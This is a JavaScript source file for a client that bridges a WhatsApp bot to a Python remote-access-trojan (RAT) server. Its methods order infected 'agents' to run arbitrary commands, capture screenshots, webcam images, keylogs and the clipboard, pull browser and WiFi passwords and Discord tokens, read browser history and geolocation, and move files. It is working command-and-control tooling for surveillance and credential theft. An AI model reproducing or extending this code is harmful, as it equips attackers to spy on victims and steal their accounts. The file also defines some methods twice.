import fetch from 'node-fetch';
import { ConfigLoader } from './configLoader.js';

/**
 * API Bridge Client - WhatsApp Bot to Python RAT Server
 * Communicates with Python rest_api_server.py via REST endpoints
 */
export class APIBridgeClient {
  constructor() {
    this.config = new ConfigLoader();
    this.baseUrl = `http://${this.config.getServer().listen_ip}:${this.config.getServer().api_port}/api`;
    this.timeout = 10000;
  }

  /**
   * Check server health
   */
  async health() {
    try {
      const response = await fetch(`${this.baseUrl}/health`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  /**
   * Get server statistics
   */
  async getStats() {
    try {
      const response = await fetch(`${this.baseUrl}/stats`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * List all connected agents
   */
  async listAgents() {
    try {
      const response = await fetch(`${this.baseUrl}/agents`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get agent details
   */
  async getAgent(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get agent status
   */
  async getAgentStatus(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/status`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Execute command on agent
   */
  async executeCommand(agentId, command) {
    try {
      const response = await fetch(`${this.baseUrl}/command/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          agent_id: agentId, 
          command: command 
        }),
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get command history for agent
   */
  async getHistory(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/history`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get alerts
   */
  async getAlerts() {
    try {
      const response = await fetch(`${this.baseUrl}/alerts`, {
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Create alert
   */
  async createAlert(agentId, level, message) {
    try {
      const response = await fetch(`${this.baseUrl}/alerts`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          agent_id: agentId, 
          level: level, 
          message: message 
        }),
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get file from agent
   */
  async getFile(agentId, filePath) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/file`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ path: filePath }),
        timeout: 30000
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Upload file to agent
   */
  async uploadFile(agentId, fileName, fileData) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/upload`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          filename: fileName, 
          data: fileData 
        }),
        timeout: 30000
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get screenshot from agent
   */
  async getScreenshot(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/screenshot`, {
        timeout: 30000
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Kill agent
   */
  async killAgent(agentId) {
    try {
      const response = await fetch(`${this.baseUrl}/agents/${agentId}/kill`, {
        method: 'POST',
        timeout: this.timeout
      });
      return await response.json();
    } catch (error) {
      return { error: error.message };
    }
  }

  /**
   * Get server statistics with detailed breakdown
   */
  async getServerStats() {
    try {
      const response = await fetch(`${this.baseUrl}/stats`, {
        timeout: this.timeout
      });
      const data = await response.json();
      return {
        uptime: data.uptime,
        agents: data.agents,
        commands_executed: data.commands_executed,
        data_transferred: data.data_transferred,
        active_sessions: data.active_sessions,
        alerts_count: data.alerts_count
      };
    } catch (error) {
      return { error: error.message };
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // COMPATIBILITY METHODS - Wraps executeCommand for specific operations
  // ═══════════════════════════════════════════════════════════════

  /**
   * Get screenshot from agent
   */
  async getScreenshot(agentId) {
    const result = await this.executeCommand(agentId, 'screenshot');
    return {
      success: !result.error,
      image: result.data?.image || result.data,
      error: result.error
    };
  }

  /**
   * Get webcam from agent
   */
  async getWebcam(agentId) {
    const result = await this.executeCommand(agentId, 'webcam');
    return {
      success: !result.error,
      image: result.data?.image || result.data,
      error: result.error
    };
  }

  /**
   * Get system info from agent
   */
  async getSystemInfo(agentId) {
    const result = await this.executeCommand(agentId, 'sysinfo');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get processes from agent
   */
  async getProcesses(agentId) {
    const result = await this.executeCommand(agentId, 'processes');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get metrics from agent
   */
  async getMetrics(agentId) {
    const result = await this.executeCommand(agentId, 'metrics');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get software/programs from agent
   */
  async getSoftware(agentId) {
    const result = await this.executeCommand(agentId, 'software');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Kill process on agent
   */
  async killProcess(agentId, pid) {
    const result = await this.executeCommand(agentId, `kill ${pid}`);
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Network scan on agent
   */
  async networkScan(agentId) {
    const result = await this.executeCommand(agentId, 'netscan');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get geolocation of agent
   */
  async getGeolocation(agentId) {
    const result = await this.executeCommand(agentId, 'locate');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Enumerate USB devices on agent
   */
  async enumerateUSB(agentId) {
    const result = await this.executeCommand(agentId, 'usb');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get browser passwords from agent
   */
  async getPasswords(agentId) {
    const result = await this.executeCommand(agentId, 'passwords');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get WiFi passwords from agent
   */
  async getWiFiPasswords(agentId) {
    const result = await this.executeCommand(agentId, 'wifi');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get Discord tokens from agent
   */
  async getDiscordTokens(agentId) {
    const result = await this.executeCommand(agentId, 'discord');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get browser history from agent
   */
  async getBrowserHistory(agentId, browser = 'chrome') {
    const result = await this.executeCommand(agentId, `history ${browser}`);
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Download file from agent
   */
  async downloadFile(agentId, filepath) {
    const result = await this.executeCommand(agentId, `download ${filepath}`);
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Upload file to agent
   */
  async uploadFile(agentId, targetPath, fileBuffer) {
    try {
      const response = await fetch(`${this.baseUrl}/command/upload`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          agent_id: agentId,
          target_path: targetPath,
          file_data: fileBuffer.toString('base64')
        }),
        timeout: this.timeout
      });
      const data = await response.json();
      return {
        success: !data.error,
        data: data.data,
        error: data.error
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Get keylogs from agent
   */
  async getKeylogs(agentId) {
    const result = await this.executeCommand(agentId, 'keylogs');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get clipboard from agent
   */
  async getClipboard(agentId) {
    const result = await this.executeCommand(agentId, 'clipboard');
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Send command to agent
   */
  async sendCommand(agentId, command, timeout = 30000) {
    const result = await this.executeCommand(agentId, command);
    return {
      success: !result.error,
      data: result.data,
      error: result.error
    };
  }

  /**
   * Get all sessions (legacy compatibility)
   */
  async getSessions() {
    const response = await this.listAgents();
    return response.agents || [];
  }

  /**
   * Set active session (no-op in REST API)
   */
  setActiveSession(sessionId) {
    // No-op in REST API - agents are managed by ID
  }
}

